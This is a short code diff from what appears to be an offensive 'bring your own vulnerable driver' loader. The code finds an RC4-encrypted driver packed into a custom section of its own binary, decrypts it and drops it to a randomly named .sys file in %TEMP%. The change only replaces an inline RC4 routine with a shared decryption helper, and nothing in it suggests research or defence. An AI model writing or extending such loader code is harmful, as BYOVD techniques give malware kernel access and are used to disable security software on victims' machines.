@@ -24,26 +24,6 @@
 
 static const uint8_t JDRV_MAGIC[8] = {'J','O','C','K','Y','D','R','V'};
 
-/* ── RC4 – must match packer.cpp exactly ─────────────────────────────── */
-
-static void byovd_rc4(uint8_t* data, size_t len, const uint8_t* key)
-{
-    uint8_t  S[256];
-    uint32_t i, j = 0;
-    for (i = 0; i < 256; i++) S[i] = (uint8_t)i;
-    for (i = 0; i < 256; i++) {
-        j = (j + S[i] + key[i % 16]) & 0xFF;
-        uint8_t t = S[i]; S[i] = S[j]; S[j] = t;
-    }
-    i = 0; j = 0;
-    for (size_t n = 0; n < len; n++) {
-        i = (i + 1) & 0xFF;
-        j = (j + S[i]) & 0xFF;
-        uint8_t t = S[i]; S[i] = S[j]; S[j] = t;
-        data[n] ^= S[(S[i] + S[j]) & 0xFF];
-    }
-}
-
 /* ── Locate .jdrv in the running binary's in-memory image ───────────── */
 
 static uint8_t* find_jdrv_section(uint32_t* out_size)
@@ -113,7 +93,7 @@ bool jocky_byovd_load(const char*    service_name,
                                                PAGE_READWRITE);
     if (!drv_buf) return false;
     memcpy(drv_buf, encrypted, orig_size);
-    byovd_rc4(drv_buf, orig_size, rc4_key);
+    jocky_decrypt_rc4(drv_buf, orig_size, rc4_key, 16);
 
     /* 3. Drop to %TEMP%\<rand8>.sys */
     char tmp_dir[MAX_PATH];
